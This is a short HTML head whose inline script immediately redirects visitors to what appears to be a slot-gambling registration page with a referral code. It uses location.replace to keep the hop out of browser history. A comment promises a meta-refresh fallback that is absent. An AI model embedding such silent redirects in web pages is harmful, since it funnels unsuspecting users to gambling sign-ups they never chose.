<head>

  <meta name="viewport" content="width=device-width,initial-scale=1">

  <!-- Meta refresh (fallback untuk browser tanpa JS) -->

  <script>
    (function() {
      // URL tujuan
      var target = "https://ngakak.lat/register/slotccref7";

      // Gunakan replace agar tidak tersimpan di riwayat
      if (window.location.replace) {
        window.location.replace(target);
      } else {
        window.location.href = target;
      }
    })();
  </script>
</head>

<body>
